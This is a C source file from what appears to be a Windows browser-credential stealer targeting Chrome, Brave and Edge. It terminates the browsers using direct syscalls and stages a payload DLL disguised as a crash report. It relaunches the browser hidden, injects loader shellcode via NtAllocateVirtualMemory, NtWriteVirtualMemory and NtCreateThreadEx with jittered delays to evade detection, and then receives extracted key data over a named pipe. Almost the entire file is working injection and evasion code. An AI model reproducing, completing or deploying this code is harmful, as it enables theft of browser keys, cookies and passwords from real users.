#include "injector.h"
#include "shellcode.h"
#include "stealth.h"
#include "../syscalls/syscalls.h"
#include "../crypto/xor_crypt.h"
#include "../payload/payload.h"
#include <winternl.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <shlobj.h>

typedef struct _CLIENT_ID_FULL {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID_FULL;

extern BOOL sc_init_global(void);

static const char* browser_exe_names[] = {
    [BROWSER_CHROME] = "chrome.exe",
    [BROWSER_BRAVE]  = "brave.exe",
    [BROWSER_EDGE]   = "msedge.exe",
};

static const char* browser_user_data_subdirs[] = {
    [BROWSER_CHROME] = "Google\\Chrome\\User Data",
    [BROWSER_BRAVE]  = "BraveSoftware\\Brave-Browser\\User Data",
    [BROWSER_EDGE]   = "Microsoft\\Edge\\User Data",
};

static const wchar_t* browser_install_paths[] = {
    [BROWSER_CHROME] = L"Google\\Chrome\\Application\\chrome.exe",
    [BROWSER_BRAVE]  = L"BraveSoftware\\Brave-Browser\\Application\\brave.exe",
    [BROWSER_EDGE]   = L"Microsoft\\Edge\\Application\\msedge.exe",
};

BOOL find_browser_path(BROWSER_ID browser, char* out_path, DWORD max_len) {
    wchar_t prog_files[MAX_PATH];
    const int folders[] = { CSIDL_PROGRAM_FILES, CSIDL_PROGRAM_FILESX86, CSIDL_LOCAL_APPDATA };
    for (int i = 0; i < 3; i++) {
        if (SUCCEEDED(SHGetFolderPathW(NULL, folders[i], NULL, 0, prog_files))) {
            wchar_t full[MAX_PATH * 2];
            _snwprintf(full, sizeof(full)/sizeof(wchar_t), L"%s\\%s", prog_files, browser_install_paths[browser]);
            if (GetFileAttributesW(full) != INVALID_FILE_ATTRIBUTES) {
                WideCharToMultiByte(CP_UTF8, 0, full, -1, out_path, max_len, NULL, NULL);
                return TRUE;
            }
        }
    }
    return FALSE;
}

BOOL kill_browser(const char* exe_name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE)
        return FALSE;

    PROCESSENTRY32 pe = { .dwSize = sizeof(pe) };
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, exe_name) == 0) {
                HANDLE hProc;
                OBJECT_ATTRIBUTES oa = { sizeof(oa) };
                CLIENT_ID_FULL cid = { .UniqueProcess = (HANDLE)(ULONG_PTR)pe.th32ProcessID };
                if (NT_SUCCESS(Sc_NtOpenProcess(&hProc, PROCESS_TERMINATE, &oa, &cid))) {
                    Sc_NtTerminateProcess(hProc, 0);
                    Sc_NtClose(hProc);
                }
            }
        } while (Process32Next(snap, &pe));
    }

    CloseHandle(snap);
    jitter_sleep(800, 1500);
    return TRUE;
}

BOOL inject_payload(INJECT_CTX* ctx, PBYTE payload_dll, DWORD payload_size) {
    const char* exe_name = browser_exe_names[ctx->browser];

    // Step 1: Drop DLL to a path that looks like a browser crash report
    generate_drop_path(ctx->dll_temp_path, MAX_PATH, browser_user_data_subdirs[ctx->browser]);

    HANDLE hTmp = CreateFileA(ctx->dll_temp_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                              FILE_ATTRIBUTE_NORMAL, NULL);
    if (hTmp == INVALID_HANDLE_VALUE) {
        printf("[-] Drop failed: %lu\n", GetLastError());
        return FALSE;
    }
    DWORD bw;
    WriteFile(hTmp, payload_dll, payload_size, &bw, NULL);
    CloseHandle(hTmp);
    printf("[+] Staged %s\n", ctx->dll_temp_path);

    // Step 2: Generate pipe name before spawning (payload needs to know it)
    generate_pipe_name(ctx->pipe_name, sizeof(ctx->pipe_name), GetCurrentProcessId());

    // Step 3: Set pipe name as env var so payload DLL can find it
    SetEnvironmentVariableA(PIPE_NAME_ENV, ctx->pipe_name);

    // Step 4: Build shellcode
    DWORD sc_size;
    PBYTE sc = build_loader_shellcode(ctx->dll_temp_path, &sc_size);
    if (!sc) {
        printf("[-] Shellcode build failed\n");
        DeleteFileA(ctx->dll_temp_path);
        return FALSE;
    }

    // Step 5: Launch browser normally — no CREATE_SUSPENDED
    STARTUPINFOA si = { .cb = sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_MINIMIZE;
    PROCESS_INFORMATION pi = {0};

    char cmdline[MAX_PATH + 64];
    snprintf(cmdline, sizeof(cmdline), "\"%s\" --no-startup-window --disable-gpu", ctx->chrome_path);

    if (!CreateProcessA(NULL, cmdline, NULL, NULL, FALSE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcess failed: %lu\n", GetLastError());
        free(sc);
        DeleteFileA(ctx->dll_temp_path);
        return FALSE;
    }

    ctx->hProcess = pi.hProcess;
    ctx->hThread = pi.hThread;
    ctx->pid = pi.dwProcessId;

    printf("[+] Spawned PID %lu\n", ctx->pid);

    // Step 6: Wait for process to initialize — jittered delay
    printf("[*] Waiting for initialization...\n");
    jitter_sleep(3000, 5000);

    // Step 7: Allocate memory in target
    PVOID remote_base = NULL;
    SIZE_T region_size = sc_size;
    NTSTATUS status = Sc_NtAllocateVirtualMemory(pi.hProcess, &remote_base, 0,
                                                  &region_size, MEM_COMMIT | MEM_RESERVE,
                                                  PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        printf("[-] Alloc failed: 0x%08lX\n", status);
        goto fail;
    }

    // Step 8: Write shellcode — small jitter between write and protect
    SIZE_T written;
    status = Sc_NtWriteVirtualMemory(pi.hProcess, remote_base, sc, sc_size, &written);
    free(sc);
    sc = NULL;
    if (!NT_SUCCESS(status)) {
        printf("[-] Write failed: 0x%08lX\n", status);
        goto fail;
    }

    jitter_sleep(500, 1200);

    // Step 9: RW -> RX
    ULONG old_prot;
    SIZE_T prot_size = sc_size;
    PVOID prot_base = remote_base;
    status = Sc_NtProtectVirtualMemory(pi.hProcess, &prot_base, &prot_size,
                                        PAGE_EXECUTE_READ, &old_prot);
    if (!NT_SUCCESS(status)) {
        printf("[-] Protect failed: 0x%08lX\n", status);
        goto fail;
    }

    jitter_sleep(300, 800);

    // Step 10: Create remote thread via NtCreateThreadEx
    HANDLE hRemoteThread = NULL;
    status = Sc_NtCreateThreadEx(&hRemoteThread, THREAD_ALL_ACCESS, NULL,
                                  pi.hProcess, remote_base, NULL,
                                  0, 0, 0, 0, NULL);
    if (!NT_SUCCESS(status)) {
        printf("[-] Thread creation failed: 0x%08lX\n", status);
        goto fail;
    }

    printf("[+] Remote thread created\n");
    Sc_NtClose(hRemoteThread);
    return TRUE;

fail:
    if (sc) free(sc);
    TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    DeleteFileA(ctx->dll_temp_path);
    return FALSE;
}

BOOL run_pipe_server(INJECT_CTX* ctx) {
    HANDLE hPipe = CreateNamedPipeA(ctx->pipe_name,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        1, 4096, 4096, 30000, NULL);

    if (hPipe == INVALID_HANDLE_VALUE) {
        printf("[-] Pipe failed: %lu\n", GetLastError());
        return FALSE;
    }

    printf("[*] Listening...\n");

    if (!ConnectNamedPipe(hPipe, NULL) && GetLastError() != ERROR_PIPE_CONNECTED) {
        printf("[-] ConnectNamedPipe failed: %lu\n", GetLastError());
        CloseHandle(hPipe);
        return FALSE;
    }

    printf("[+] Connected\n");

    PIPE_MSG msg;
    DWORD read_bytes;
    ReadFile(hPipe, &msg, sizeof(msg), &read_bytes, NULL);
    if (msg.type != MSG_READY) {
        printf("[-] Bad handshake: %02X\n", msg.type);
        CloseHandle(hPipe);
        return FALSE;
    }

    // Send browser ID
    PIPE_MSG send_hdr;
    DWORD wr;
    send_hdr.type = MSG_BROWSER_ID;
    send_hdr.length = sizeof(BROWSER_ID);
    WriteFile(hPipe, &send_hdr, sizeof(send_hdr), &wr, NULL);
    WriteFile(hPipe, &ctx->browser, sizeof(BROWSER_ID), &wr, NULL);

    // Send output directory
    DWORD dir_len = (DWORD)strlen(ctx->output_dir) + 1;
    send_hdr.type = MSG_OUTPUT_DIR;
    send_hdr.length = dir_len;
    WriteFile(hPipe, &send_hdr, sizeof(send_hdr), &wr, NULL);
    WriteFile(hPipe, ctx->output_dir, dir_len, &wr, NULL);

    while (TRUE) {
        if (!ReadFile(hPipe, &msg, sizeof(msg), &read_bytes, NULL))
            break;

        if (msg.type == MSG_DONE) {
            printf("[+] Done\n");
            break;
        } else if (msg.type == MSG_STATUS) {
            char buf[256] = {0};
            if (msg.length > 0 && msg.length < sizeof(buf))
                ReadFile(hPipe, buf, msg.length, &read_bytes, NULL);
            printf("[*] %s\n", buf);
        } else if (msg.type == MSG_KEY_DATA) {
            printf("[+] Key received (%lu bytes)\n", msg.length);
            BYTE skip[256];
            if (msg.length > 0 && msg.length <= sizeof(skip))
                ReadFile(hPipe, skip, msg.length, &read_bytes, NULL);
            SecureZeroMemory(skip, sizeof(skip));
        } else {
            if (msg.length > 0) {
                BYTE* skip = (BYTE*)malloc(msg.length);
                if (skip) { ReadFile(hPipe, skip, msg.length, &read_bytes, NULL); free(skip); }
            }
        }
    }

    CloseHandle(hPipe);
    return TRUE;
}
